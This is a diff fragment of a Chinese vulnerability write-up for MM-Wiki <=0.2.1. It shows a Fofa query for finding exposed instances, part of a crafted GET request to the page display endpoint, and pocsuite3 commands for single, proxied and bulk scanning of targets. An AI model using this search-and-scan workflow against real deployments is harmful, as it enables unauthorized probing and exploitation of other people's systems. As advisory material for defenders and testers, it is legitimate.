@@ -33,10 +33,10 @@ MM-Wiki 是一个轻量级的企业知识分享与团队协同软件，可用于
   
 0x02 影响平台  
 ```
-MM-Wiki <=0.2.1
+MM-Wiki <=0.2.1
 ```  
   
-0x03 漏洞复现  
+0x03 漏洞复现  
 ```
 Fofa: header="mmwikissid"
 ```  
@@ -47,7 +47,7 @@ Fofa: header="mmwikissid"
   
 构造payload，发送数据包  
 ```
-GET /page/display?document_id=1 HTTP/1.1
+GET /page/display?document_id=1 HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
@@ -70,7 +70,7 @@ Connection: close
 https://github.com/phachon/mm-wiki
 ```  
   
-0x05 参考链接  
+0x05 参考链接  
 ```
 https://github.com/phachon/mm-wiki
 ```  
@@ -82,11 +82,11 @@ https://github.com/phachon/mm-wiki
 使用方法：pocsuite -r mm-wiki-wsq.py -u [url]  
 ```
 pocsuite3安装(python3环境)
-pip3 install pocsuite3
+pip3 install pocsuite3
 设置代理
 pocsuite -r POC.py -u [url] --proxy http://IP:PORT
 批量验证
-pocsuite -r POC.py -f [file.txt]
+pocsuite -r POC.py -f [file.txt]
 ```  
   
   
